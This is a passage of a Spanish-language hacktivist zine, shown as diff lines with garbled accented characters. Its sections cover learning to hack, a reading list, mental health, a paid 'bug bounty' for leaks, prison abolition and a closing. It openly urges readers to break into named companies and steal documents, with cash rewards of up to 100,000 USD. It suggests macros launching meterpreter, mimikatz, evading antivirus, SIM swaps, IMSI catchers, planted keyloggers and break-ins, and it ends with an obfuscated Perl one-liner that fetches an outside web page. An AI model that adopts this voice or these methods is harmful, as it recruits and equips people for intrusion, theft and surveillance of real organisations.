+desigual. Y la filtraciÃ³n de sus finanzas, Â¿es acaso un peligro para ellos, o
+tan sÃ³lo para su posiciÃ³n en lo alto de una jerarquÃ­a que ni siquiera deberÃ­a
+existir?
+
+                          ,---------------------------------------------------.
+          _,-._           | Nos vilifican, esos infames; cuando la Ãºnica      | 
+         ; ___ :          | diferencia es que ellos roban a los pobres        |
+    ,--'  (. .) '--.__    | amparados por la ley, lo sabe el cielo, y nosotros|
+  _;       |||        \   | saqueamos a los ricos bajo la Ãºnica protecciÃ³n de |
+ '._,-----''';=.____,"    | nuestro propio coraje. Â¿No has de preferir ser    |
+   /// < o>   |##|        | uno de nosotros, antes que pordiosear ante esos   |
+   (o        \`--'       /  villanos en busca de trabajo?                     |
+  ///\ >>>>  _\ <<<<    //`---------------------------------------------------'
+ --._>>>>>>>><<<<<<<<  / 
+ ___() >>>[||||]<<<<
+ `--'>>>>>>>><<<<<<<
+      >>>>>>><<<<<<
+        >>>>><<<<<
+         >>ctr<<
+
+    CapitÃ¡n Bellamy
+
+    
+--[ 11 - Aprende a hackear ]----------------------------------------------------
+
+    No se empieza hackeando bien. Empiezas hackeando mierda, pensando
+    que es bueno, y luego poco a poco vas mejorando. Por eso siempre digo
+    que una de las virtudes mÃ¡s valiosas es la persistencia.
+
+    - Consejos de Octavia Butler para la aspirante a APT
+
+La mejor forma de aprender a hackear es hackeando. Armate un laboratorio con
+mÃ¡quinas virtuales y empezÃ¡ a probar cosas, tomÃ¡ndote un break para investigar
+cualquier cosa que no entiendas. Como mÃ­nimo vas a querer un servidor windows
+como controlador de dominio, otra vm windows normal unida al dominio, y una
+mÃ¡quina de desarrollo con visual studio para compilar y modificar herramientas.
+Intenta hacer un documento de office con macros que lancen meterpreter u otro
+RAT, y probÃ¡ meterpreter, mimikatz, bloodhound, kerberoasting, smb relaying,
+psexec y otras tÃ©cnicas de pase lateral [1]; asÃ­ como los otros scripts,
+herramientas y tÃ©cnicas mencionados en esta guÃ­a y en la anterior [2]. Al
+principio puedes deshabilitar windows defender, pero luego probalo todo
+teniÃ©ndolo activado [3][4] (pero desactivando el envÃ­o automÃ¡tico de muestras).
+Una vez que estÃ©s a gusto con todo eso, estarÃ¡s lista para hackear el 99% de las
+compaÃ±Ã­as. Hay un par de cosas que en algÃºn momento serÃ¡n muy Ãºtiles en tu
+aprendizaje, como desenvolverte cÃ³modamente con bash y cmd.exe, un dominio
+bÃ¡sico de powershell, python y javascript, tener conocimiento de kerberos [5][6]
+y active directory [7][8][9][10], y un inglÃ©s fluido. Un buen libro
+introductorio es The Hacker Playbook.
+
+Quiero tambiÃ©n escribir un poco sobre cosas en las que no centrarse si no te
+quieres entretener sÃ³lo porque alguien te haya dicho que no eres una hacker "de
+verdad" si no sabes ensamblador. Obviamente, aprende lo que sea que te interese,
+pero escribo estas lÃ­neas pensando en aquellas cosas en las que te puedes
+centrar a fin de conseguir resultados prÃ¡cticos si lo que buscas es hackear
+compaÃ±Ã­as para filtrar y expropiar. Un conocimiento bÃ¡sico de seguridad en
+aplicaciones web [11] es Ãºtil, pero especializarte mÃ¡s en seguridad web no es
+realmente el mejor uso de tu tiempo, a menos que quieras hacer una carrera en
+pentesting o cazando recompensas por bugs. Los CTFs, y la mayorÃ­a de los
+recursos que encontrarÃ¡s al buscar informaciÃ³n sobre hacking, se centran
+generalmente en habilidades como seguridad web, ingenierÃ­a inversa, desarrollo
+de exploits, etc. Cosas que tienen sentido entendiÃ©ndolas como una forma de
+preparar gente para las carreras en la industria, pero no para nuestros
+objetivos. Las agencias de inteligencia pueden darse el lujo de tener un equipo
+dedicado a lo mÃ¡s avanzado en fuzzing, un equipo trabajando en desarrollo de
+exploits con un gÃ¼ey investigando exclusivamente las nuevas tÃ©cnicas de
+manipulaciÃ³n del montÃ­culo, etc. Nosotras no tenemos ni el tiempo ni los
+recursos para eso. Las dos habilidades de lejos mÃ¡s importantes para el hacking
+prÃ¡ctico son el phishing [12] y la ingenierÃ­a social para conseguir acceso
+inicial, y luego poder escalar y moverte por los dominios windows.
+
+[1] https://hausec.com/2019/08/12/offensive-lateral-movement/
+[2] https://www.exploit-db.com/papers/41914
+[3] https://blog.sevagas.com/IMG/pdf/BypassAVDynamics.pdf
+[4] https://www.trustedsec.com/blog/
+    discovering-the-anti-virus-signature-and-bypassing-it/
+[5] https://www.tarlogic.com/en/blog/how-kerberos-works/
+[6] https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+[7] https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/
+[8] https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/
+[9] https://adsecurity.org/
+[10] https://github.com/infosecn1nja/AD-Attack-Defense
+[11] https://github.com/jhaddix/tbhm
+[12] https://blog.sublimesecurity.com/red-team-techniques-gaining-access-on-an-
+     external-engagement-through-spear-phishing/
+
+
+--[ 12 - Lecturas Recomendadas ]------------------------------------------------
+
+ __________________________________________
+/ Cuando el nivel cientÃ­fico de un mundo   \
+| supera por mucho su nivel de solidaridad,|
+\ ese mundo se autodestruye.               /
+ ------------------------------------------
+                  \   _.---._   .            .
+            *      \.'       '.       *
+*               _.-~===========~-._
+    .          (___________________)       .   *
+              .'     \_______/   .' 
+                           .'  .'  
+                          '         
+                     - Ami
+
+Casi todo el hacking hoy dÃ­a se hace por hackers de sombrero negro, para su 
+provecho personal; o por hackers de sombrero blanco, para el provecho de los 
+accionistas (y en defensa de los bancos, compaÃ±Ã­as y estados que nos estÃ¡n 
+aniquilando a nosotras y al planeta en que vivimos); y por militares y 
+agencias de inteligencia, como parte de su agenda de guerra y conflictos. Viendo 
+que este nuestro mundo ya estÃ¡ al lÃ­mite, he pensado que, ademÃ¡s de estos
+consejos tÃ©cnicos para aprender a hackear, debÃ­a incluir algunos recursos que
+han sido muy importantes para mi desarrollo y me han guiado en el uso de mis
+conocimientos de hacking.
+
+* Ami: El NiÃ±o de las Estrellas - Enrique Barrios 
+
+* La AnarquÃ­a Funciona 
+  https://es.theanarchistlibrary.org/library/peter-gelderloos-la-anarquia- 
+  funciona
+
+* Viviendo Mi Vida - Emma Goldman
+
+* The Rise and Fall of Jeremy Hammond: Enemy of the State
+  https://www.rollingstone.com/culture/culture-news/the-rise-and-fall-of-jeremy-
+  hammond-enemy-of-the-state-183599/
+
+  Este cuate y el hack de HBGary fueron una inspiraciÃ³n
+
+* DÃ­as de Guerra, Noches de Amor - Crimethinc
+
+* Momo - Michael Ende
+
+* Cartas a un joven poeta - Rilke
+
+* Dominion (Documental)
+  "no podemos creer que, si no miramos, no sucederÃ¡ lo que no queremos ver"
+  - Tolstoy en ÐŸÐµÑ€Ð²Ð°Ñ ÑÑ‚ÑƒÐ¿ÐµÐ½ÑŒ
+
+* Bash Back!
+
+
+--[ 13 - Sanar ]----------------------------------------------------------------
+
+El mundo hacker tiene una alta incidencia de depresiÃ³n, suicidios y ciertas
+batallas con la salud mental. No creo que sea a causa del hacking, sino por la
+clase de ambiente del que en su mayorÃ­a provienen los hackers. Como muchas
+hackers, crecÃ­ con escaso contacto humano: fui una niÃ±a criada por el internet.
+Tengo mis luchas con la depresiÃ³n y el entumecimiento emocional. A Willie Sutton
+se le cita con frecuencia diciendo que robaba bancos porque "allÃ­ es donde estÃ¡
+el dinero", pero la cita es incorrecta. Lo que realmente dijo fue:
+
+    Â¿Por quÃ© robaba bancos? Porque lo disfrutaba. Amaba hacerlo. Estaba mÃ¡s 
+    vivo cuando estaba dentro de un banco, en pleno atraco, que en cualquier 
+    otro momento de mi vida. Lo disfrutaba tanto que una o dos semanas despuÃ©s 
+    ya estaba buscando la siguiente oportunidad. Pero para mÃ­ el dinero era una
+    minucia, nada mÃ¡s.
+
+El hacking me ha hecho sentir viva. ComenzÃ³ como una forma de automedicar la
+depresiÃ³n. MÃ¡s tarde me di cuenta de que, en realidad, podÃ­a servir para hacer
+algo positivo. No me arrepiento para nada de la forma en que crecÃ­, trajo varias
+experiencias hermosas a mi vida. Pero sabÃ­a que no podÃ­a continuar viviendo de
+esa manera. AsÃ­ que comencÃ© a pasar mÃ¡s tiempo alejada de mi computadora, con
+otras personas, aprendiendo a abrirme al mundo, a sentir mis emociones, a
+conectar con los demÃ¡s, a aceptar riesgos y ser vulnerable. Cosas mucho mÃ¡s
+difÃ­ciles que hackear, pero a la mera hora la recompensa vale mÃ¡s la pena. AÃºn
+me supone un esfuerzo, pero aunque sea de forma lenta y tambaleante, siento que
+voy por buen camino.
+
+El hacking, hecho con conciencia, tambiÃ©n puede ser lo que nos sana. SegÃºn la
+sabidurÃ­a maya, tenemos un don otorgado por la naturaleza, que debemos
+comprender para ponerlo al servicio de la comunidad. En [1], se explica:
+
+    Cuando una persona no acepta su trabajo o misiÃ³n empieza a padecer
+    enfermedades, aparentemente incurables; aunque no llega a morir en corto
+    tiempo, sino Ãºnicamente sufre, con el objetivo de despertar o tomar
+    conciencia. Por eso es indispensable que una persona que ha adquirido los
+    conocimientos y realiza su trabajo en las comunidades debe pagar su Toj y
+    mantener una comunicaciÃ³n constante con el Creador y su ruwÃ¤ch qâ€™ij, pues
+    necesita constantemente de la fuerza y energÃ­a de estos. De lo contrario,
+    las enfermedades que lo hicieron reaccionar o tomar el trabajo podrÃ­an
+    volver a causar daÃ±o.
+
+Si sientes que el hacking estÃ¡ alimentando tu aislamiento, depresiÃ³n, u otros
+padecimientos, respira. Date un tiempo para conocerte y tomar conciencia. Vos
+mereces vivir feliz, con salud y plenitud.
+
+ ________________________
+< All Cows Are Beautiful >
+ ------------------------
+         \
+          \ ^__^
+            (oo)\_______
+         (  (__)\       )\/\
+          _) /  ||----w |
+         (.)/   ||     ||
+          `'
+
+[1] Ruxeâ€™el mayabâ€™ Kâ€™aslemÃ¤l: RaÃ­z y espÃ­ritu del conocimiento maya
+    https://www.url.edu.gt/publicacionesurl/FileCS.ashx?Id=41748
+
+
+--[ 14 - El Programa Hacktivista de Caza de Bugs ]------------------------------
+
+Me parece que hackear para conseguir y filtrar documentos de interÃ©s pÃºblico es
+una de las mejores maneras en que lxs hackers pueden usar sus habilidades en
+beneficio de la sociedad. Por desgracia para nosotras las hackers, como en casi
+todo rubro, los incentivos perversos de nuestro sistema econÃ³mico no coinciden
+con aquello que beneficia a la sociedad. AsÃ­ que este programa es mi intento de
+hacer posible que lxs buenxs hackers se puedan ganar la vida de forma honesta
+poniendo al descubierto material de interÃ©s pÃºblico, en vez de tener que andar
+vendiendo su trabajo a las industrias de la ciberseguridad, el cibercrimen o la
+ciberguerra. Entre algunos ejemplos de compaÃ±Ã­as por cuyos leaks me encantarÃ­a
+pagar estÃ¡n las empresas mineras, madereras y ganaderas que saquean nuestra
+hermosa AmÃ©rica Latina (y asesinan a las defensoras de la tierra y el territorio
+que tratan de detenerles), empresas involucradas en ataques a Rojava como Baykar
+Makina o Havelsan, compaÃ±Ã­as de vigilancia como el grupo NSO, criminales de
+guerra y aves de rapiÃ±a como Blackwater y Halliburton, empresas penitenciarias
+privadas como GeoGroup y CoreCivic/CCA, y lobbistas corporativos como ALEC.
+Presta atenciÃ³n a la hora de elegir dÃ³nde investigas. Por ejemplo, es bien
+conocido que las petroleras son malvadas: se enriquecen a costa de destruir el
+planeta (y allÃ¡ por los 80s las propias empresas ya sabÃ­an de las consecuencias
+de su actividad [1]). Pero si les hackeas directamente, tendrÃ¡s que bucear entre
+una increÃ­ble cantidad de informaciÃ³n aburridÃ­sima acerca de sus operaciones
+cotidianas. Muy probablemente te va a ser mucho mÃ¡s fÃ¡cil encontrar algo
+interesante si en cambio te enfocas en sus lobbistas [2]. Otra manera de
+seleccionar objetivos viables es leyendo historias de periodistas de
+investigaciÃ³n (como [3]), que son interesantes pero carecen de evidencias
+sÃ³lidas. Y eso es exactamente lo que tus hackeos pueden encontrar.
+
+PagarÃ© hasta 100 mil USD por cada filtraciÃ³n de este tipo, segÃºn el interÃ©s 
+pÃºblico e impacto del material, y el laburo requerido en el hackeo. Sobra decir
+que una filtraciÃ³n completa de los documentos y comunicaciones internas de
+alguna de estas empresas supondrÃ¡ un beneficio para la sociedad que sobrepasa
+esos cien mil, pero no estoy tratando de enriquecer a nadie. SÃ³lo quiero proveer
+de fondos suficientes para que las hackers puedan ganarse la vida de forma digna
+haciendo un buen trabajo. Por limitaciones de tiempo y consideraciones de
+seguridad no voy a abrir el material, ni a inspeccionarlo por mÃ­ misma, sino que
+leerÃ© lo que la prensa diga al respecto una vez se haya publicado, y harÃ© una
+estimaciÃ³n del interÃ©s pÃºblico a partir de ahÃ­. Mi informaciÃ³n de contacto estÃ¡
+al final de la guÃ­a mencionada antes [4].
+
+CÃ³mo obtengas el material es cosa tuya. Puedes usar las tÃ©cnicas tradicionales 
+de hacking esbozadas en esta guÃ­a y la anterior [4]. PodrÃ­as hacerle una sim
+swap [5] a un empresario o politiquero corrupto, y luego descargar sus correos y
+backups desde la nube. Puedes pedir un IMSI catcher de alibaba y usarlo afuera
+de sus oficinas. Puedes hacer un poco de war-driving (del antiguo o del nuevo
+[6]). Puede que seas una persona dentro de sus organizaciones que ya tiene
+acceso. Puedes optar por un estilo low-tech tipo old-school como en [7] y [8], y
+sencillamente colarte en sus oficinas. Lo que sea que te funcione.
+
+[1] https://www.theguardian.com/environment/climate-consensus-97-per-cent/2018/
+    sep/19/shell-and-exxons-secret-1980s-climate-change-warnings
+[2] https://theintercept.com/2019/08/19/oil-lobby-pipeline-protests/
+[3] https://www.bloomberg.com/features/2016-como-manipular-una-eleccion/
+[4] https://www.exploit-db.com/papers/41914
+[5] https://www.vice.com/en_us/article/vbqax3/
+    hackers-sim-swapping-steal-phone-numbers-instagram-bitcoin
+[6] https://blog.rapid7.com/2019/09/05/this-one-time-on-a-pen-test-your-mouse-
+    is-my-keyboard/
+[7] https://en.wikipedia.org/wiki/Citizens%27_Commission_to_Investigate_the_FBI
+[8] https://en.wikipedia.org/wiki/Unnecessary_Fuss
+
+
+----[ 14.1 - Pagos parciales ]--------------------------------------------------
+
+Â¿Eres una camarera de buen corazÃ³n que trabaja en una compaÃ±Ã­a del mal [1]?
+Â¿EstarÃ­as dispuesta a introducir sigilosamente un keylogger fÃ­sico en la
+computadora de un ejecutivo, a cambiar su cable de carga USB por uno modificado
+[2], esconder un micro en alguna sala de reuniones donde planean sus
+atrocidades, o a dejar uno de estos [3] olvidado en algÃºn rincÃ³n de las
+oficinas? 
+
+[1] https://en.wikipedia.org/wiki/Evil_maid_attack
+[2] http://mg.lol/blog/defcon-2019/
+[3] https://shop.hak5.org/products/lan-turtle
+
+Â¿Eres bueno con ingenierÃ­a social y phishing, y conseguiste una shell en la 
+computadora de un empleado, o por ahÃ­ conseguiste sus credenciales de la vpn
+usando phishing? Â¿Pero quizÃ¡s no pudiste conseguir admin de dominio y descargar
+lo que querÃ­as?
+
+Â¿Participaste en programas de bug bounties y te convertiste en una experta en
+el hacking de aplicaciones web, pero no tienes suficiente experiencia hacker
+para penetrar completamente la compaÃ±Ã­a?
+
+Â¿Tienes facilidad con la ingenierÃ­a inversa? Escanea algunas compaÃ±Ã­as del mal
+para ver quÃ© dispositivos tienen expuestos a internet (firewall, vpn, y 
+pasarelas de correo electrÃ³nico serÃ¡n mucho mÃ¡s Ãºtiles que cosas como cÃ¡maras
+IP), aplÃ­cales ingenierÃ­a inversa y encuentra alguna vulnerabilidad explotable
+de forma remota.
+
+Si me es posible trabajar con vos para penetrar la compaÃ±Ã­a y conseguir material
+de interÃ©s pÃºblico, igualmente serÃ¡s recompensada por tu trabajo. Si es que no
+tengo el tiempo de trabajar en ello yo misma, al menos tratarÃ© de aconsejarte
+acerca de cÃ³mo continuar hasta que puedas completar el hackeo por tu cuenta.
+
+Apoyar a aquellos en el poder para hackear y vigilar a disidentes, activistas y
+a la poblaciÃ³n en general es hoy dÃ­a una industria de varios miles de millones
+de dÃ³lares, mientras que hackear y exponer a quienes estÃ¡n en el poder es un
+trabajo voluntario y arriesgado. Convertirlo en una industria de varios millones
+de dÃ³lares ciertamente no va a arreglar ese desequilibrio de poder, ni va a
+solucionar los problemas de la sociedad. Pero creo que va a ser divertido. AsÃ­
+que... Â¡ya quiero ver gente comenzando a cobrar sus recompensas!
+
+
+--[ 15 - Abolir las prisiones ]-------------------------------------------------
+
+                   Construidas por el enemigo pa encerrar ideas
+                encerrando compaÃ±eros pa acallar gritos de guerra
+                    es el centro de tortura y aniquilamiento
+                   donde el ser humano se vuelve mÃ¡s violento
+              es el reflejo de la sociedad, represiva y carcelaria
+                   sostenida y basada en lÃ³gicas autoritarias
+                       custodiadas reprimidos y vigilados
+                   miles de presas y presos son exterminados
+                 ante esta mÃ¡quina esquizofrÃ©nica y despiadada
+                 compaÃ±ero Axel Osorio dando la pela en la cana
+                  rompiendo el aislamiento y el silenciamiento
+                  fuego y guerra a la cÃ¡rcel, vamos destruyendo!
+
+                    Rap Insurrecto - Palabras En Conflicto
+
+
+SerÃ­a tÃ­pico terminar un zine hacker diciendo liberen a hammond, liberen a
+manning, liberen a hamza, liberen a los detenidos por el montaje del Ð´ÐµÐ»Ð¾ Ð¡ÐµÑ‚Ð¸,
+etc. Voy a llevar esta tradiciÃ³n a su consecuencia mÃ¡s radical [1], y a decir:
+Â¡hay que abolir las prisiones ya!. Siendo yo misma una delincuente, pueden
+pensar que lo que ocurre es que tengo una visiÃ³n un poco sesgada del asunto.
+Pero en serio, es que ni siquiera es un tema controvertido, incluso la ONU estÃ¡
+prÃ¡cticamente de acuerdo [2]. AsÃ­ que, de una buena vez, liberen a las personas
+migrantes [3][4][5][6], encarceladas a menudo por esos mismos paÃ­ses que crearon
+la guerra y la destrucciÃ³n ambiental y econÃ³mica de la que huyen. Liberen a
+todos los que estÃ¡n en prisiÃ³n por la guerra contra quienes usan drogas [7].
+Liberen a todas las personas encarceladas por la guerra contra los pobres [8].
+Las prisiones lo Ãºnico que hacen es esconder e ignorar la prueba de la
+existencia de los problemas sociales, en lugar de arreglarlos de a de veras. Y
+hasta que todxs sean liberados, lucha contra el sistema carcelario recordando y
+teniendo presentes a aquellos que estÃ¡n atrapados ahÃ­ dentro. EnvÃ­ales cariÃ±o,
+cartas, helicÃ³pteros [9], radios piratas [10] y libros, y apoya a quienes se
+organizan desde ahÃ­ adentro [11][12].
+
+[1] http://www.bibliotecafragmentada.org/wp-content/uploads/2017/12/
+    Davis-Son-obsoletas-las-prisiones-final.pdf
+[2] http://www.unodc.org/pdf/criminal_justice/Handbook_of_Basic_Principles_and_
+    Promising_Practices_on_Alternatives_to_Imprisonment.pdf
+[3] https://www.theguardian.com/us-news/2016/dec/21/
+    us-immigration-detention-center-christmas-santa-wish-list
+[4] https://www.theguardian.com/us-news/2016/aug/18/us-border-patrol-facility-
+    images-tucson-arizona
+[5] https://www.playgroundmag.net/now/detras-Centros-Internamiento-Extranjeros-
+    Espana_22648665.html
+[6] https://www.nytimes.com/2019/06/26/world/australia/
+    australia-manus-suicide.html
+[7] https://en.wikiquote.org/wiki/John_Ehrlichman#Quotes
+[8] VI, 2. i. La multa impaga: https://scielo.conicyt.cl/scielo.php?script=
+    sci_arttext&pid=S0718-00122012000100005
+[9] p. 10, Libelo NÂº2. BoletÃ­n polÃ­tico desde la CÃ¡rcel de Alta Seguridad
+[10] https://itsgoingdown.org/transmissions-hostile-territory/
+[11] https://freealabamamovement.wordpress.com/f-a-m-pamphlet-who-we-are/
+[12] https://incarceratedworkers.org/
+
+
+--[ 16 - ConclusiÃ³n ]-----------------------------------------------------------
+
+Nuestro mundo estÃ¡ patas arriba [1]. Tenemos un sistema de justicia que
+representa a la injusticia. La ley y el orden estÃ¡n ahÃ­ para crear una ilusiÃ³n
+de paz social, y ocultar lo sistemÃ¡tico y profundo de la explotaciÃ³n, la
+violencia, y la injusticia. Mejor seguir a tu conciencia, y no a la ley.
+
+[1] http://resistir.info/livros/galeano_patas_arriba.pdf
+
+Los hombres de negocios se enriquecen maltratando a las personas y al planeta,
+mientras que el trabajo de los cuidados queda mayormente sin pagar. Mediante el
+asalto a todo lo comunal, de algÃºn modo hemos levantado ciudades densamente
+pobladas, plagadas por la soledad y el aislamiento. El sistema cultural,
+polÃ­tico y econÃ³mico en que vivimos alienta las peores facetas de la naturaleza
+humana: la avaricia, el egoÃ­smo y egocentrismo, la competitividad, la falta de
+compasiÃ³n y el apego por la autoridad. AsÃ­ que, para quien haya conseguido
+permanecer sensible y compasivo en un mundo frÃ­o, para todas las heroÃ­nas
+cotidianas que practican la bondad en las pequeÃ±as cosas, para todas ustedes que
+aÃºn tienen una estrella encendida en sus corazones: Ð³Ð¾pÐ¸, Ð³Ð¾pÐ¸ ÑÑÐ½Ð¾, Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð½Ðµ
+Ð¿Ð¾Ð³Ð°ÑÐ»Ð¾!
+
+                     _____________________
+                    <  Â¡Cantemos juntas!  >
+                     ---------------------
+                             \
+                              \ ^__^
+                                (oo)\_______
+                             (  (__)\       )\/\
+                              _) /  ||----w |
+                             (.)/   ||     ||
+
+                                 Ãbrete corazÃ³n
+
+                               Ãbrete sentimiento
+
+                              Ãbrete entendimiento
+
+                            Deja a un lado la razÃ³n
+
+                Y deja brillar el sol escondido en tu interior
+
+                
+perl -Mre=eval <<\EOF
+                                       ''                                     
+                                      =~(                                     
+                                      '(?'                                    
+                                     .'{'.(                                   
+                                    '`'|'%'                                   
+                                    ).("\["^                                  
+                                   '-').('`'|                                 
+                                  '!').("\`"|                                 
+                                  ',').'"(\\$'                                
+                                 .':=`'.(('`')|                               
+                                '#').('['^'.').                               
+                                ('['^')').("\`"|                              
+     ',').('{'^'[').'-'.('['^'(').('{'^'[').('`'|'(').('['^'/').('['^'/').(   
+    '['^'+').('['^'(').'://'.('`'|'%').('`'|'.').('`'|',').('`'|'!').("\`"|   
+      '#').('`'|'%').('['^'!').('`'|'!').('['^'+').('`'|'!').('['^"\/").(     
+         '`'|')').('['^'(').('['^'/').('`'|'!').'.'.('`'|'%').('['^'!')       
+            .('`'|',').('`'|'.').'.'.('`'|'/').('['^')').('`'|"\'").          
+              '.'.('`'|'-').('['^'#').'/'.('['^'(').('`'|('$')).(             
+                 '['^'(').('`'|',').'-'.('`'|'%').('['^('(')).                
+                    '/`)=~'.('['^'(').'|</'.('['^'+').'>|\\'                  
+                       .'\\'.('`'|'.').'|'.('`'|"'").';'.                     
+                         '\\$:=~'.('['^'(').'/<.*?>//'                        
+                         .('`'|"'").';'.('['^'+').('['^                       
+                        ')').('`'|')').('`'|'.').(('[')^                      
+                       '/').('{'^'[').'\\$:=~/('.(('{')^                      
+                       '(').('`'^'%').('{'^'#').('{'^'/')                     
+                      .('`'^'!').'.*?'.('`'^'-').('`'|'%')                    
+                     .('['^'#').("\`"|    ')').('`'|'#').(                    
+                     '`'|'!').('`'|          '.').('`'|'/')                   
+                    .'..)/'.('['               ^'(').'"})')                   
+                    ;$:="\."^                     '~';$~='@'                  
+                   |'(';$^=                          ')'^'[';                 
+                  $/='`'                                |'.';                 
+                  $,=                                      '('           
+EOF
+
+
+               Nosotras nacimos de la noche.
+               en ella vivimos, hackeamos en ella.
+                
+               AquÃ­ estamos, somos la dignidad rebelde,
+               el corazÃ³n olvidado de la Ð˜Ð½Ñ‚ÐµÑ€Ð½ÐµÑ‚.
+                
+               Nuestra lucha es por la memoria y la justicia,
+               y el mal gobierno se llena de criminales y asesinos.
+                
+               Nuestra lucha es por un trabajo justo y digno,
+               y el mal gobierno y las corporaciones compran y venden zero days.
+
+               Para todas el maÃ±ana.
+               Para nosotras la alegre rebeldÃ­a de las filtraciones
+               y la expropiaciÃ³n.
+
+               Para todas todo.
+               Para nosotras nada.
+
+
+               Desde las montaÃ±as del Sureste CibernÃ©tico,
+        
+                _   _            _      ____             _    _ 
+               | | | | __ _  ___| | __ | __ )  __ _  ___| | _| |
+               | |_| |/ _` |/ __| |/ / |  _ \ / _` |/ __| |/ / |
+               |  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|
+               |_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_)
